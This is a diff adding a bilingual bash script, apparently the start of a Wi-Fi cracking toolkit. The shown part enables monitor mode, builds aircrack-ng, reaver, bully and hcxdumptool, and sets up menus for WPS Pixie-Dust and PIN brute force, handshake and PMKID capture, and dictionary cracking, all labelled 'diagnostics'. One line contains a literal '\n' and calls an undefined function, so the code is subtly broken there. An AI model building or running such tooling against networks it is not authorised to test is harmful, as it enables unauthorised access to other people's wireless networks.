@@ -1,0 +1,2724 @@
+#!/bin/bash
+# wh-master: один файл — много команд (wh/цр, installwh, uninstallwh, wifistart, wifistop)
+set -u
+set -m
+# Глобальная страховка: Ctrl+C НИГДЕ не роняет скрипт. Отдельные функции
+# (read_key/prompt_input) ловят его локально и трактуют как Esc/отмену.
+# Здесь — общий предохранитель на случай мест, не покрытых локально.
+trap ':' INT
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
+BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'
+WHITE='\033[1;37m'; BOLD='\033[1m'; NC='\033[0m'; BG_SEL='\033[7m'
+info(){ echo -e "${GREEN}[*]${NC} $1"; }
+warn(){ echo -e "${YELLOW}[!]${NC} $1"; }
+err(){ echo -e "${RED}[X]${NC} $1"; }
+LANG_FILE=/root/.wh_lang
+LANG_UI=$(cat "$LANG_FILE" 2>/dev/null || echo ru)
+if [ "$EUID" -ne 0 ]; then exec sudo "$0" "$@"; fi
+SELF=$(readlink -f "$0")
+if [ -n "${SUDO_USER:-}" ]; then USER_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6); else USER_HOME="$HOME"; fi
+[ -z "$USER_HOME" ] && USER_HOME="$HOME"
+
+MON=""; TARGET_BSSID=""; TARGET_CHANNEL=""; SELECTED_IDX=0
+HCX_TARGET=""; RUN_LOG=""
+WIFI_DIR="$USER_HOME/wifi-tools"
+DATA_DIR="$USER_HOME/wifi-unlock"
+HACK_LOG="$DATA_DIR/wifi-saved.log"
+mkdir -p "$WIFI_DIR" "$DATA_DIR" 2>/dev/null
+# файлы создаются под sudo (root) — возвращаем владельца пользователю
+fix_owner(){
+    [ -n "${SUDO_USER:-}" ] && chown "$SUDO_USER":"$(id -gn "$SUDO_USER" 2>/dev/null)" "$@" 2>/dev/null
+}
+fix_owner "$WIFI_DIR" "$DATA_DIR"
+
+# ── Подпапки по инструментам (чтобы не сваливать всё в кучу) ──────────
+# Логи скана и сохранённых сетей остаются в корне $DATA_DIR (их не трогаем).
+PMKID_DIR="$DATA_DIR/pmkid"
+HS_DIR="$DATA_DIR/handshake"
+PIXIE_DIR="$DATA_DIR/pixie"
+REAVER_DIR="$DATA_DIR/reaver"
+BULLY_DIR="$DATA_DIR/bully"
+WPASEC_DIR="$DATA_DIR/wpasec"
+mkdir -p "$PMKID_DIR" "$HS_DIR" "$PIXIE_DIR" "$REAVER_DIR" "$BULLY_DIR" "$WPASEC_DIR" 2>/dev/null
+fix_owner "$PMKID_DIR" "$HS_DIR" "$PIXIE_DIR" "$REAVER_DIR" "$BULLY_DIR" "$WPASEC_DIR"
+
+# Чистка ESSID для имени файла: транслит кириллицы, пробелы/спецсимволы → _, пустой → BSSID.
+# $1=essid  $2=bssid(опц.)  → печатает безопасный ярлык
+translit_ru() {
+    # ГОСТ-подобный транслит; sed по буквам (регистр сохраняем)
+    printf '%s' "$1" | sed -e '
+      s/а/a/g; s/б/b/g; s/в/v/g; s/г/g/g; s/д/d/g; s/е/e/g; s/ё/e/g;
+      s/ж/zh/g; s/з/z/g; s/и/i/g; s/й/y/g; s/к/k/g; s/л/l/g; s/м/m/g;
+      s/н/n/g; s/о/o/g; s/п/p/g; s/р/r/g; s/с/s/g; s/т/t/g; s/у/u/g;
+      s/ф/f/g; s/х/kh/g; s/ц/ts/g; s/ч/ch/g; s/ш/sh/g; s/щ/shch/g;
+      s/ъ//g; s/ы/y/g; s/ь//g; s/э/e/g; s/ю/yu/g; s/я/ya/g;
+      s/А/A/g; s/Б/B/g; s/В/V/g; s/Г/G/g; s/Д/D/g; s/Е/E/g; s/Ё/E/g;
+      s/Ж/Zh/g; s/З/Z/g; s/И/I/g; s/Й/Y/g; s/К/K/g; s/Л/L/g; s/М/M/g;
+      s/Н/N/g; s/О/O/g; s/П/P/g; s/Р/R/g; s/С/S/g; s/Т/T/g; s/У/U/g;
+      s/Ф/F/g; s/Х/Kh/g; s/Ц/Ts/g; s/Ч/Ch/g; s/Ш/Sh/g; s/Щ/Shch/g;
+      s/Ъ//g; s/Ы/Y/g; s/Ь//g; s/Э/E/g; s/Ю/Yu/g; s/Я/Ya/g;'
+}
+sanitize_tag() {
+    local essid="$1" bssid="${2:-}" out
+    out=$(translit_ru "$essid")
+    out=$(printf '%s' "$out" | tr -c 'A-Za-z0-9._-' '_' | sed 's/__*/_/g; s/^_//; s/_$//')
+    if [ -z "$out" ] || [ "$out" = "_" ]; then
+        out=$(printf '%s' "$bssid" | tr -c 'A-Za-z0-9' '-')
+    fi
+    [ -z "$out" ] && out="unknown"
+    printf '%s' "$out"
+}
+# Единая метка времени для имён: ГГГГММДД_ЧЧММ (без секунд)
+stamp_now() { date '+%Y%m%d_%H%M'; }
+
+# ── wifistart (встроенный) ────────────────────────────────────────────
+# Достаёт читаемое название адаптера (модель) + тип (USB/встроенный)
+adapter_info(){
+    local iface="$1" devpath busid name type
+    devpath=$(readlink -f "/sys/class/net/$iface/device" 2>/dev/null)
+    if echo "$devpath" | grep -q '/usb'; then
+        type="$(t adapter_usb)"
+        # название из /sys/.../product или через lsusb по vendor:product
+        name=$(cat "$devpath/../product" 2>/dev/null || cat "$devpath/product" 2>/dev/null)
+        if [ -z "$name" ]; then
+            local vid pid
+            vid=$(cat "$devpath/../idVendor" 2>/dev/null || cat "$devpath/idVendor" 2>/dev/null)
+            pid=$(cat "$devpath/../idProduct" 2>/dev/null || cat "$devpath/idProduct" 2>/dev/null)
+            [ -n "$vid" ] && [ -n "$pid" ] && name=$(lsusb 2>/dev/null | grep -i "$vid:$pid" | sed 's/.*ID [0-9a-f:]* //I' | head -1)
+        fi
+    else
+        type="$(t adapter_pci)"
+        busid=$(basename "$devpath" 2>/dev/null)
+        name=$(lspci 2>/dev/null | grep -i "${busid#0000:}" | sed 's/^[0-9a-f:.]* //I' | head -1)
+    fi
+    [ -z "$name" ] && name="Wi-Fi"
+    echo "$name|$type"
+}
+
+# Собирает все Wi-Fi интерфейсы с поддержкой monitor mode
+list_wifi_ifaces(){
+    local iface phy
+    for iface in /sys/class/net/*/; do
+        iface=$(basename "$iface")
+        [ "$iface" = "lo" ] && continue
+        [ -e "/sys/class/net/$iface/phy80211" ] || continue
+        phy=$(cat "/sys/class/net/$iface/phy80211/name" 2>/dev/null)
+        [ -z "$phy" ] && continue
+        # адаптер должен уметь monitor mode
+        iw phy "$phy" info 2>/dev/null | grep -qi 'monitor' && echo "$iface"
+    done
+}
+
+# Выбор адаптера: один — сразу; несколько — список; ноль — ошибка.
+# Результат в переменную PICKED_IFACE.
+pick_wifi_iface(){
+    PICKED_IFACE=""
+    local ifaces=() i
+    while IFS= read -r i; do [ -n "$i" ] && ifaces+=("$i"); done < <(list_wifi_ifaces)
+    if [ "${#ifaces[@]}" -eq 0 ]; then
+        err "$(t no_adapter)"; return 1
+    fi
+    if [ "${#ifaces[@]}" -eq 1 ]; then
+        PICKED_IFACE="${ifaces[0]}"; return 0
+    fi
+    # несколько — рисуем меню выбора
+    local sel=0 n="${#ifaces[@]}"
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}  $(t pick_adapter)${NC}\n"
+        local idx
+        for idx in "${!ifaces[@]}"; do
+            local ifc="${ifaces[idx]}" info drv nm tp
+            info=$(adapter_info "$ifc"); nm="${info%|*}"; tp="${info#*|}"
+            drv=$(basename "$(readlink -f "/sys/class/net/$ifc/device/driver" 2>/dev/null)" 2>/dev/null)
+            local line
+            line=$(printf "%-8s %-22s (%s, %s)" "$ifc" "$nm" "$drv" "$tp")
+            if [ "$idx" -eq "$sel" ]; then echo -e "${BG_SEL} $((idx+1)) $line ${NC}"
+            else echo -e "  ${WHITE}$((idx+1)) $line${NC}"; fi
+        done
+        echo -e "\n${CYAN}$(t pick_hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        case "$key" in
+            up)   ((sel>0)) && ((sel--)) ;;
+            down) ((sel<n-1)) && ((sel++)) ;;
+            esc)  return 1 ;;
+            enter) PICKED_IFACE="${ifaces[sel]}"; return 0 ;;
+            num:*) if [ "$num" -ge 1 ] && [ "$num" -le "$n" ]; then PICKED_IFACE="${ifaces[num-1]}"; return 0; fi ;;
+        esac
+    done
+}
+
+wifistart_main() {
+    local IFACE MONI OUT
+    # выбор адаптера (список, если несколько; сразу — если один)
+    pick_wifi_iface || return 1
+    IFACE="$PICKED_IFACE"
+    # монитор уже поднят на этом адаптере?
+    if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
+        MONI="$IFACE"
+        info "$(L "Мониторный режим уже активен на $MONI — использую его." "Monitor mode already active on $MONI — using it.")"
+    else
+        info "$(L "Найден адаптер: $IFACE" "Adapter found: $IFACE")"
+        info "$(L "Убиваю мешающие процессы..." "Killing interfering processes...")"
+        airmon-ng check kill >/dev/null 2>&1
+        systemctl stop avahi-daemon.socket avahi-daemon.service >/dev/null 2>&1 || true
+
+        info "$(L "Поднимаю мониторный режим на $IFACE..." "Enabling monitor mode on $IFACE...")"
+        OUT=$(airmon-ng start "$IFACE" 2>&1)
+        MONI=$(echo "$OUT" | grep -oP 'on \[[^]]+\]\K\S+' | head -1)
+        [ -z "$MONI" ] && MONI=$(iw dev 2>/dev/null | grep -oP 'Interface \K\S*mon\S*' | head -1)
+        # если airmon не переименовал — интерфейс мог остаться прежним в monitor
+        [ -z "$MONI" ] && iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor" && MONI="$IFACE"
+
+        [ -z "$MONI" ] && { err "$(L "Не удалось поднять монитор" "Failed to enable monitor")"; return 1; }
+        ip link set "$MONI" up 2>/dev/null
+        local tries=0
+        while [ $tries -lt 3 ]; do
+            sleep 1
+            if iw dev "$MONI" info 2>/dev/null | grep -q "type monitor"; then break; fi
+            tries=$((tries+1))
+        done
+        iw dev "$MONI" info 2>/dev/null | grep -q "type monitor" || { err "$(L "$MONI не в monitor" "$MONI not in monitor mode")"; return 1; }
+    fi
+
+    echo "$MONI" > /tmp/.wifistart_mon
+    info "$(L "Мониторный режим готов на $MONI" "Monitor mode ready on $MONI")"
+}
+
+wifistop_main() {
+    local MONI=""
+    [ -f /tmp/.wifistart_mon ] && MONI=$(cat /tmp/.wifistart_mon 2>/dev/null)
+    if [ -z "$MONI" ] || ! iw dev 2>/dev/null | grep -q "Interface $MONI"; then
+        MONI=$(iw dev 2>/dev/null | grep -oP 'Interface \K\S*mon\S*' | head -1)
+    fi
+    if [ -n "$MONI" ]; then info "$(L "Выключаю $MONI..." "Disabling $MONI...")"; airmon-ng stop "$MONI" >/dev/null 2>&1
+    else warn "$(L "Монитор не найден — возможно, уже выключен" "Monitor not found — probably already off")"; fi
+    rm -f /tmp/.wifistart_mon
+    info "$(L "Поднимаю сетевые сервисы..." "Restoring network services...")"
+    systemctl start avahi-daemon.socket avahi-daemon.service >/dev/null 2>&1 || true
+    systemctl start wpa_supplicant >/dev/null 2>&1 || true
+    systemctl list-unit-files 2>/dev/null | grep -q '^NetworkManager\.service' && systemctl start NetworkManager >/dev/null 2>&1 || true
+    info "$(L "Система возвращена в нормальный режим" "System restored to normal mode")"
+}
+
+# ── installwh (встроенный) ────────────────────────────────────────────
+ROOT=/opt/wifi-tools; SRC="$ROOT/src"; mkdir -p "$SRC"
+WH_REPO=""
+NAMES=(aircrack-ng pixiewps reaver bully hcxdumptool hcxtools)
+declare -A URL=(
+ [aircrack-ng]=https://github.com/aircrack-ng/aircrack-ng
+ [pixiewps]=https://github.com/wiire-a/pixiewps
+ [reaver]=https://github.com/t6x/reaver-wps-fork-t6x
+ [bully]=https://github.com/aanarchyy/bully
+ [hcxdumptool]=https://github.com/ZerBea/hcxdumptool
+ [hcxtools]=https://github.com/ZerBea/hcxtools
+)
+
+ensure_links(){
+    local n
+    for n in цр installwh uninstallwh wifistart wifistop; do
+        ln -sf "$SELF" "/usr/local/bin/$n"
+    done
+}
+
+detect_pm(){
+    if [ -f /etc/altlinux-release ] || grep -qi "ALT" /etc/os-release 2>/dev/null; then
+        PM=alt; DISTRO="ALT Linux"
+    elif command -v dnf >/dev/null 2>&1; then PM=dnf; DISTRO="Fedora/RHEL"
+    elif command -v apt-get >/dev/null 2>&1; then PM=apt; DISTRO="Debian/Ubuntu"
+    elif command -v pacman >/dev/null 2>&1; then PM=pacman; DISTRO="Arch"
+    else PM=none; DISTRO="Unknown"; fi
+    info "$(L "Система: $DISTRO | Менеджер: $PM" "System: $DISTRO | Manager: $PM")"
+}
+
+
+ensure_deps(){
+    detect_pm
+    info "$(L "Пакетный менеджер: $PM" "Package manager: $PM")"
+    [ "$LANG_UI" = en ] && local PMLC="LC_ALL=C" || local PMLC=""
+    case $PM in
+    alt) env $PMLC apt-get update >/dev/null 2>&1; env $PMLC apt-get install -y git make gcc gcc-c++ pkg-config libtool_2.4 autoconf automake libnl-devel libpcap-devel zlib-devel libpcre2-devel libsqlite3-devel libssl-devel libcurl-devel usbutils pciutils || true ;;
+    apt) env $PMLC apt-get update -y >/dev/null 2>&1; env $PMLC apt-get install -y git make gcc g++ pkg-config libtool autoconf automake libnl-3-dev libnl-genl-3-dev libpcap-dev zlib1g-dev libpcre2-dev libsqlite3-dev libssl-dev libcurl4-openssl-dev usbutils pciutils || true ;;
+    dnf) env $PMLC dnf install -y git make gcc gcc-c++ pkgconfig libtool autoconf automake libnl3-devel libpcap-devel zlib-devel pcre2-devel sqlite-devel openssl-devel libcurl-devel usbutils pciutils || true ;;
+    pacman) env $PMLC pacman -S --noconfirm git make gcc pkgconf libtool autoconf automake libnl libpcap zlib pcre2 sqlite openssl curl usbutils pciutils || true ;;
+    none) warn "$(L "Пакетный менеджер не найден — зависимости ставь вручную" "Package manager not found — install dependencies manually")" ;;
+    esac
+}
+
+remote_head(){ git ls-remote "$1" HEAD 2>/dev/null | awk '{print $1}'; }
+local_head(){ git -C "$1" rev-parse HEAD 2>/dev/null; }
+short(){ [ -n "${1:-}" ] && echo "${1:0:7}" || echo "-------"; }
+def_branch(){ git -C "$1" symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | sed 's@^refs/remotes/origin/@@'; }
+
+bin_of(){
+    case $1 in
+    aircrack-ng) command -v aircrack-ng 2>/dev/null ;;
+    pixiewps) command -v pixiewps 2>/dev/null ;;
+    reaver) command -v reaver 2>/dev/null ;;
+    bully) command -v bully 2>/dev/null || ls /home/*/bully/src/bully /root/bully/src/bully 2>/dev/null | head -1 ;;
+    hcxdumptool) command -v hcxdumptool 2>/dev/null ;;
+    hcxtools) command -v hcxpcapngtool 2>/dev/null ;;
+    esac
+}
+
+confirm(){
+    echo -e "${YELLOW}$1${NC}"
+    echo -e "${CYAN}$(L "[Enter] да | [Esc] отмена" "[Enter] yes | [Esc] cancel")${NC}"
+    local k; IFS= read -rsn1 k
+    if [[ $k == $'\e' ]]; then echo -e "${RED}$(L "Отменено." "Cancelled.")${NC}"; return 1; fi
+    return 0
+}
+
+status_line(){
+    local n="$1" b loc rem st
+    b=$(bin_of "$n"); loc=$(short "$(local_head "$SRC/$n")"); rem=$(short "$(remote_head "${URL[$n]}")")
+    if [ -z "$rem" ]; then st="$(L "нет сети" "no network")"
+    elif [ ! -d "$SRC/$n/.git" ]; then st="$(L "не склонирован" "not cloned")"
+    elif [ "$loc" = "$rem" ]; then { [ -n "$b" ] && st="$(L "актуально" "up to date")" || st="$(L "нужна сборка" "needs build")"; }
+    else st="$(L "ДОСТУПНО ОБНОВЛЕНИЕ" "UPDATE AVAILABLE")"; fi
+    printf "%-12s %-8s %-9s %-9s %s\n" "$n" "${b:+$(L да yes)}" "$loc" "$rem" "$st"
+}
+
+do_status_one(){
+    echo; printf "%-12s %-8s %-9s %-9s %s\n" "$(L ПРОЕКТ PROJECT)" "$(L БИНАРЬ BINARY)" "$(L ЛОКАЛЬНО LOCAL)" "$(L "В РЕПО" REMOTE)" "$(L СТАТУС STATUS)"
+    status_line "$1"; echo
+}
+
+do_status(){
+    echo; printf "%-12s %-8s %-9s %-9s %s\n" "$(L ПРОЕКТ PROJECT)" "$(L БИНАРЬ BINARY)" "$(L ЛОКАЛЬНО LOCAL)" "$(L "В РЕПО" REMOTE)" "$(L СТАТУС STATUS)"
+    for n in "${NAMES[@]}"; do status_line "$n"; done
+    echo
+    if [ -n "$WH_REPO" ]; then echo "$(L "wh: репозиторий = $WH_REPO" "wh: repository = $WH_REPO")"
+    else echo "$(L "wh: репозиторий не задан — точечное обновление wh пропускается" "wh: repository not set — targeted wh update skipped")"; fi
+    echo
+}
+
+build_tool(){
+    info "$(L "Сборка: $1" "Building: $1")"
+    case $1 in
+    aircrack-ng) cd "$SRC/aircrack-ng" && ./autogen.sh --with-experimental && make -j"$(nproc)" && make install && ldconfig ;;
+    pixiewps) cd "$SRC/pixiewps" && make && make install ;;
+    reaver) cd "$SRC/reaver/src" && ./configure && make -j"$(nproc)" && make install ;;
+    bully) cd "$SRC/bully/src" && make && install -m 755 bully /usr/local/bin/bully ;;
+    hcxdumptool) cd "$SRC/hcxdumptool" && make -j"$(nproc)" && make install ;;
+    hcxtools) cd "$SRC/hcxtools" && make -j"$(nproc)" && make install ;;
+    esac
+}
+
+clone_fresh(){
+    ensure_deps
+    info "$(L "Клонирование..." "Cloning...")"
+    # hcxdumptool закреплён на 6.2.9 (совместимость с ath9k_htc; 7.x ломает arm)
+    if [ "$1" = "hcxdumptool" ]; then
+        git clone --depth 1 --branch 6.2.9 "${URL[$1]}" "$SRC/$1" || { err "$(L "ошибка клонирования" "clone error")"; return 1; }
+    else
+        git clone "${URL[$1]}" "$SRC/$1" || { err "$(L "ошибка клонирования" "clone error")"; return 1; }
+    fi
+    return 0
+}
+
+rebuild_tool(){
+    local n="$1"
+    echo; info "$(L "=== $n: пересборка из локальных исходников ===" "=== $n: rebuild from local sources ===")"
+    if [ ! -d "$SRC/$n" ]; then err "$(L "$n не установлен — пересобирать нечего" "$n not installed — nothing to rebuild")"; return 1; fi
+    build_tool "$n"; info "$(L "Готово." "Done.")"; do_status_one "$n"
+}
+
+force_one(){
+    local n="$1"
+    echo; info "$(L "=== $n: ПРИНУДИТЕЛЬНОЕ обновление (чистый клон) ===" "=== $n: FORCED update (clean clone) ===")"
+    rm -rf "$SRC/$n"
+    clone_fresh "$n" || return 1
+    build_tool "$n"; do_status_one "$n"
+}
+
+update_one(){
+    local n="$1" loc rem br
+    echo; info "=== $n ==="
+    if [ ! -d "$SRC/$n/.git" ]; then
+        confirm "$(L "Проект ещё не установлен. Установить (клон+сборка)?" "Project not installed yet. Install (clone+build)?")" || return 0
+        clone_fresh "$n" || return 1
+        build_tool "$n"; do_status_one "$n"; return 0
+    fi
+    loc=$(local_head "$SRC/$n"); rem=$(remote_head "${URL[$n]}")
+    if [ -z "$rem" ]; then err "$(L "нет сети — обновление невозможно" "no network — update impossible")"; return 1; fi
+    if [ "$loc" != "$rem" ]; then
+        confirm "$(L "Доступна новая версия: ${loc:0:7} -> ${rem:0:7}. Обновить?" "New version available: ${loc:0:7} -> ${rem:0:7}. Update?")" || { info "$(L "Оставляю текущую версию." "Keeping current version.")"; return 0; }
+    else
+        confirm "$(L "Версия актуальна (коммит ${loc:0:7}). Обновить (переустановить)?" "Version is up to date (commit ${loc:0:7}). Update (reinstall)?")" || { info "$(L "Оставляю как есть." "Leaving as is.")"; return 0; }
+    fi
+    git -C "$SRC/$n" fetch --all -q || true
+    br=$(def_branch "$SRC/$n"); [ -z "$br" ] && br=master
+    git -C "$SRC/$n" reset --hard "origin/$br" || true
+    build_tool "$n"; do_status_one "$n"
+}
+
+do_update_all(){
+    local n loc rem br
+    for n in "${NAMES[@]}"; do
+        echo; info "=== $n ==="
+        if [ ! -d "$SRC/$n/.git" ]; then
+            clone_fresh "$n" || continue; build_tool "$n"; continue
+        fi
+        loc=$(local_head "$SRC/$n"); rem=$(remote_head "${URL[$n]}")
+        if [ -z "$rem" ]; then err "$(L "нет сети — пропуск" "no network — skip")"; continue; fi
+        if [ "$loc" != "$rem" ]; then
+            info "$(L "Новая версия — обновляю..." "New version — updating...")"
+            git -C "$SRC/$n" fetch --all -q || true
+            br=$(def_branch "$SRC/$n"); [ -z "$br" ] && br=master
+            git -C "$SRC/$n" reset --hard "origin/$br" || true
+            build_tool "$n"
+        else
+            [ -n "$(bin_of "$n")" ] && info "$(L "Версия актуальна, пропускаю" "Up to date, skipping")" || build_tool "$n"
+        fi
+    done
+    echo; info "$(L "Готово. Текущий статус:" "Done. Current status:")"; do_status
+}
+
+force_all(){ local n; for n in "${NAMES[@]}"; do force_one "$n"; done; }
+
+update_wh(){
+    if [ -z "$WH_REPO" ]; then
+        warn "$(L "WH_REPO не задан — обновление wh-скрипта пропущено." "WH_REPO not set — wh script update skipped.")"
+        warn "$(L "Когда создашь репозиторий, впиши URL в переменную WH_REPO внутри $SELF" "When you create a repo, put its URL into WH_REPO inside $SELF")"
+        return 0
+    fi
+    info "$(L "Обновляю wh из $WH_REPO ..." "Updating wh from $WH_REPO ...")"
+    local tmp; tmp=$(mktemp -d)
+    if git clone "$WH_REPO" "$tmp/wh-repo" 2>/dev/null; then
+        [ -f "$tmp/wh-repo/wh" ] && install -m 755 "$tmp/wh-repo/wh" /usr/local/bin/wh && info "$(L "wh обновлён" "wh updated")"
+    else err "$(L "ошибка клонирования репозитория wh" "wh repo clone error")"; fi
+    rm -rf "$tmp"
+}
+
+inst_main(){
+    ensure_links
+    local A1=${1:-all} A2=${2:-} n
+    case $A1 in
+    --status) do_status ;;
+    --force) force_all ;;
+    --update-all) do_update_all ;;
+    wh) update_wh ;;
+    aircrack-ng|pixiewps|reaver|bully)
+        case $A2 in
+        --rebuild) rebuild_tool "$A1" ;;
+        --force) force_one "$A1" ;;
+        *) update_one "$A1" ;;
+        esac ;;
+    all)
+        ensure_deps
+        for n in "${NAMES[@]}"; do
+            echo; info "$(L "=== $n: свежий клон + установка в систему ===" "=== $n: fresh clone + system install ===")"
+            rm -rf "$SRC/$n"
+            clone_fresh "$n" || continue
+            build_tool "$n"
+        done
+        sync_sources_to_kit\n        echo; info "$(L "Готово. Статус:" "Done. Status:")"; do_status ;;
+    *) echo "$(L "Использование:" "Usage:") installwh [--status|--force|--update-all|all|wh|<tool> [--rebuild|--force]]" ;;
+    esac
+}
+
+# ── uninstallwh (встроенный) ──────────────────────────────────────────
+uninst_main(){
+    local d SRC lang_choice ULANG
+    # Выбор языка (цифра без Enter; фолбэк — английский)
+    echo "Выберите язык / Choose language:"
+    echo "  [1] Русский"
+    echo "  [2] English"
+    read -rsn1 lang_choice
+    case "$lang_choice" in
+        1) ULANG=ru ;;
+        *) ULANG=en ;;
+    esac
+    echo "$ULANG" > /root/.wh_lang
+    if [ -n "${SUDO_USER:-}" ]; then USER_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6); else USER_HOME="$HOME"; fi
+    [ -z "$USER_HOME" ] && USER_HOME="$HOME"
+    SRC="$USER_HOME/wifi-tools/src"
+    [ "$ULANG" = ru ] && echo "Удаляю инструменты..." || echo "Removing tools..."
+    for d in "$SRC/aircrack-ng" "$SRC/pixiewps" "$SRC/reaver" "$SRC/hcxdumptool" "$SRC/hcxtools"; do
+        if [ -d "$d" ]; then
+            case "$d" in
+            *reaver) ( cd "$d/src" && make uninstall >/dev/null 2>&1 ) ;;
+            *) ( cd "$d" && make uninstall >/dev/null 2>&1 ) ;;
+            esac
+        fi
+    done
+    rm -f /usr/local/bin/bully
+    rm -rf "$USER_HOME/wifi-tools"
+    ldconfig 2>/dev/null
+    [ "$ULANG" = ru ] && echo "Удаляю команды..." || echo "Removing commands..."
+    for n in цр installwh uninstallwh wifistart wifistop wh; do
+        rm -f "/usr/local/bin/$n"
+    done
+    if [ "$ULANG" = en ]; then
+        echo "Done. Program removed."
+        echo "Your saved networks and logs are kept in: $USER_HOME/wifi-unlock"
+        echo "To reinstall: unpack the archive and run  sudo ./installwh.sh"
+    else
+        echo "Готово. Программа удалена."
+        echo "Сохранённые сети и логи остались в: $USER_HOME/wifi-unlock"
+        echo "Для повторной установки: распакуй архив и запусти  sudo ./installwh.sh"
+    fi
+}
+
+# ── переводы и меню ───────────────────────────────────────────────────
+declare -A TR_RU=(
+[title_main]="ГЛАВНОЕ МЕНЮ WI-FI MANAGER" [mon]="Монитор:" [net]="Сеть:"
+[nostart]="Не запущен" [nosel]="Не выбрана" [hint]="[Enter] ок | [Esc] назад"
+[hint2]="[Esc] назад | [Enter] продолжить"
+[m1]="Подготовка интерфейса (wifistart)" [m2]="Сканирование сетей"
+[m3]="WPS Диагностика (Reaver / Bully)" [m4]="WPA/WPA2 Диагностика (Handshake / PMKID)"
+[m5]="Ручной ввод команды" [m6]="Инструменты: статус и обновление"
+[m7]="Сохранённые сети" [m8]="Язык / Language" [m9]="Завершить интерфейс (wifistop)"
+[m_exit]="Выход"
+[settings_t]="Настройки"
+[help_t]="Справка (описание пунктов + команды)"
+[help_hint]="Выбери раздел — откроется описание и готовые команды."
+[help_search]="🔍 Поиск по ключевому слову"
+[help_search_q]="Что ищем (слово):" [help_search_res]="Результаты поиска по"
+[help_search_none]="Ничего не найдено. Попробуй другое слово."
+[scan_t]="Сканирование сетей" [s1]="WPS Скан (wash -F)" [s2]="Полный Скан (airodump-ng)"
+[scan_live]="Сканирую... [Esc] стоп и сохранить" [scan_hint]="[Enter] атака | [Esc] выход"
+[scan_saved]="Лог сохранён:" [scan_none]="Сети не найдены." [scan_cnt]="Сетей:"
+[atk_t]="Диагностика сети" [atk_pixie]="Pixie-Dust (Reaver -K)" [atk_reaver]="Reaver (брутфорс PIN)"
+[atk_bully]="Bully (-F -B)" [atk_hs]="Захват Handshake" [atk_pmkid]="Захват PMKID"
+[atk_note]="Сохранить в заметки" [atk_cancel]="Отмена"
+[back]="Назад в главное меню" [wps_t]="WPS Диагностика"
+[w1]="Reaver: Pixie-Dust (Офлайн, -K)" [w2]="Reaver: Классический брутфорс"
+[w3]="Bully: Принудительный брутфорс (-F -B)" [w4]="Сменить сеть (BSSID/Канал)"
+[wpa_t]="WPA/WPA2 Диагностика" [p1]="Захват Handshake (airodump)"
+[p2]="Захват PMKID по выбранной сети" [p3]="Брутфорс Handshake (aircrack-ng)"
+[p2air]="Захват PMKID — весь эфир (стандарт)" [p5hash]="Работа с хэшем (локальная / онлайн)"
+[pmk_alltgt]="все сети (эфир)"
+[pmk_hcx_err]="hcxdumptool завершился с ошибкой (вывод ниже):"
+[pmk_hash_t]="Работа с готовым хэшем" [pmk_hash_none]="Готовых хэшей в папке пока нет."
+[pmk_pick_t]="Выбери файл хэша / захвата" [pmk_files_in]="Файлы лежат в папке:"
+[pmk_hash_manual]="Указать путь к файлу вручную (.pcapng)"
+[pmk_hash_path]="Полный путь к файлу .pcapng:"
+[tools_t]="Инструменты" [t1]="Показать статус и актуальность версий"
+[t2]="Обновить и пересобрать всё"
+[t_base]="Обновить базу паролей (cracked.txt)"
+[t_rock]="Обновить словарь rockyou (~133МБ)"
+[dl_direct]="Скачиваю напрямую:" [dl_via_proxy]="Напрямую не вышло — качаю через прокси:"
+[dl_no_proxy]="Прокси не найден — пробовал напрямую."
+[base_unpack]="Распаковываю..." [base_ok]="Готово:"
+[dl_fail_manual]="Не удалось скачать (троттлинг/блокировка/нет сети)."
+[why_cracked]="Без этого файла НЕ будет работать 'Этап 1' в меню 'Диагностика WPA/WPA2 → Работа с хэшем → Локальная проверка (cracked + rockyou)' — быстрая проверка твоего хэша по базе уже засвеченных (взломанных) паролей."
+[why_rockyou]="Без этого файла НЕ будет работать 'Этап 2' в том же пункте 'Локальная проверка (cracked + rockyou)' — перебор хэша по большому словарю rockyou (~14 млн паролей). Останется только онлайн-проверка на wpa-sec."
+[dl_after]="После этого файл появится в папке — проверка заработает сама."
+[dl_url]="Скачай вручную отсюда:" [dl_unpack_to]="Распакуй и положи СЮДА (без .gz на конце):"
+[dl_hint_cmd]="Или одной командой:"
+[upd]="Обновить (скачать свежую версию)" [reb]="Пересобрать из локальных исходников"
+[frc]="Обновить принудительно (чистый клон+сборка)" [u_wh]="Обновить wh-скрипт"
+[hist_t]="СОХРАНЁННЫЕ СЕТИ" [hist_empty]="Список сохранённых сетей пуст."
+[h_date]="Дата" [h_sel]="выбрать" [h_add]="добавить вручную" [h_back]="назад"
+[h_card]="СЕТЬ" [h_edit]="изменить" [h_del]="удалить" [h_del_q]="Удалить эту запись?"
+[yes]="да" [no]="нет" [h_updated]="Запись уже была — обновлена" [h_saved]="Сохранено"
+[lang_t]="Язык / Language"
+[pr_bssid]="Введите BSSID сети:" [pr_bssid_list]="Введите BSSID сети (из списка выше):"
+[pr_chan]="Введите Канал:" [pr_cap]="Путь к .cap/.pcap:" [pr_dict]="Путь к словарю:"
+[pr_cmd]="Введите команду (Esc для отмены):" [pr_cancel]="(Esc для отмены)"
+[pr_enterfor]="(Enter для:"
+[msg_nomon]="Мониторный режим не поднят!"
+[msg_startw]="[Enter] запустить wifistart | [Esc] отмена"
+[msg_cancel]="Отменено." [msg_monfail]="Не удалось поднять монитор."
+[msg_run]="> Выполняю:" [msg_done]="✓ Завершено. [Esc] в меню | [Enter] продолжить"
+[wps_verdict]="Итог атаки:"
+[wps_ok]="Успех! Ключ/PIN найден (см. выше и в заметках)."
+[wps_locked]="WPS заблокирован на роутере (защита сработала или WPS выключен)."
+[wps_nack]="Точка отклонила подбор (NACK). WPS закрыт или защищён."
+[wps_weak]="Таймаут/слабая связь — сеть далеко или слабый сигнал."
+[wps_nobeacon]="Не удалось поймать сеть (нет beacon). Проверь канал/дистанцию."
+[wps_unknown]="Готово. Подробности — в логе атаки (файл выше)."
+[wps_try_pmkid]="Совет: для этой сети попробуй PMKID или Handshake вместо WPS."
+[press_hint]="[Esc] в меню | [Enter] продолжить"
